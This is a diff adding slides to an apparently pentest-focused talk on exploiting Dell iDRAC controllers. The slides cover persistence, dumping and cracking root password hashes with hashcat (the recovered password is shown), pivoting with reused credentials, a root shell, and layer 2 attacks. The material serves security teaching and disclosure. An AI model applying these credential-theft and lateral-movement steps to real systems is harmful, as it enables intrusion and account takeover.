@@ -7,8 +7,8 @@
 #+REVEAL_TITLE_SLIDE: <h1>%t<h1><h3>%s</h3><h4>%a<br>%d</h4><img style="position:absolute; top:250px; left:700px; width:150px; height:150px; transform: rotate(30deg)" src="img/cppc.png">
 #+REVEAL_EXTRA_CSS: css/asciinema-player.css
 #+REVEAL_EXTRA_SCRIPTS: ("js/asciinema-player.js")
-#+REVEAL_PLUGINS: (highlight search)
-
+#+REVEAL_PLUGINS: (highlight search notes)
+#+REVEAL_INIT_SCRIPT: totalTime: 2400
 #+REVEAL_EXTRA_CSS: css/custom.css
 
 #+OPTIONS: timestamp:nil num:nil toc:nil
@@ -113,8 +113,70 @@
     [[./img/drac_cve.png]]
 ** RCE Demo
   #+REVEAL_HTML: <asciinema-player src="casts/rce_demo.cast" preload="yes" poster="npt:0:03" theme="tomorrow-night-bright" rows=45></asciinema-player>
+** Persistence
+   * Until a reboot
+   * Until an update
+   * Forever?
+     * Cron jobs
+     * syslog-ng hooks
+     * Overwrite an updated file?
 ** CVE Results
    #+attr_html: :width 580px
     [[./img/drac_results.png]]
+** Recovering Credentials
+   #+begin_src bash
+   % root:sAcyG/RZbH7ScaJjXLO/kefW564eRXs4ilf+VX0f+K4=:2:1:Administrator:/flash/data0/home/root:/bin/sh:0x1FF...
+   % ./drac_exec 10.87.5.42 | ./dump_hashes.sh
+   10.87.5.42_root:F269FB2DA3CD3A842D15263736A57D51E55600819F195E678C3E8152ED3B5693:F77E82DAED468941C81D9B08AC755695
+   #+end_src
+** vast.ai
+   #+attr_html: :width 500px
+    [[./img/vast_ai.png]]
+** Hashcat
+   #+begin_src bash
+   hashcat -O -a 3 -m 1410 hashes --username --hex-salt
+   #+end_src
+   #+begin_src bash
+     f26...c755695:"C4tnapz!"
+     Session..........: hashcat
+     Status...........: Cracked
+     Hash.Name........: sha256($pass.$salt)
+     Hash.Target......: f269...755695
+     Speed.#1.........:     9746.6 MH/s (70.35ms) @ Accel:8 Loops:1024 Thr:1024 Vec:1
+     Speed.#2.........:     9507.4 MH/s (72.12ms) @ Accel:8 Loops:1024 Thr:1024 Vec:1
+     Speed.#3.........:     9691.5 MH/s (70.75ms) @ Accel:8 Loops:1024 Thr:1024 Vec:1
+     Speed.#4.........:     9641.1 MH/s (71.12ms) @ Accel:8 Loops:1024 Thr:1024 Vec:1
+     Speed.#5.........:    10081.9 MH/s (68.01ms) @ Accel:8 Loops:1024 Thr:1024 Vec:1
+     Speed.#6.........:     9043.4 MH/s (75.82ms) @ Accel:8 Loops:1024 Thr:1024 Vec:1
+     Speed.#7.........:     9819.2 MH/s (69.83ms) @ Accel:8 Loops:1024 Thr:1024 Vec:1
+     Speed.#8.........:     9642.4 MH/s (71.11ms) @ Accel:8 Loops:1024 Thr:1024 Vec:1
+     Speed.Total......:    77173.6 MH/s
+     Recovered........: 1/1 (100.00%) Digests
+   #+end_src
+* Pivoting
+  * Find other management interfaces with the same credentials
+  * Layer 2 attacks to other management interfaces
+  * Scan non-management interfaces: https://github.com/ncsa/ssh-auditor
+** Got root
+  #+begin_src bash
+  [root@proxy-01 ~]# w
+  21:21:53 up 598 days,  8:38,  1 user,  load average: 0.00, 0.01, 0.05
+  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+  root     pts/0    vlad-pentest 21:21    1.00s  0.00s  0.00s w
+  #+end_src
+  #+REVEAL_HTML: <img src="https://thumbs.gfycat.com/ElderlyFarawayCrossbill.webp"></img>
+* Layer 2 Attacks
+  #+begin_src bash
+  2: eno16180012: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:50:56:81:fa:08 brd ff:ff:ff:ff:ff:ff
+    inet "100.120.95.17/21" brd 100.120.99.255 scope global noprefixroute eno16180012
+  #+end_src
+** Bettercap
+   https://bettercap.org
+   #+attr_html: :width 500px
+   [[./img/bettercap.png]]
+* Findings
+   #+attr_html: :width 500px
+   [[./img/findings.png]]
 * Trash                                                            :noexport:
 #####+REVEAL_INIT_SCRIPT: parallaxBackgroundImage: "./background.jpg", parallaxBackgroundSize: "6211px 1686px"
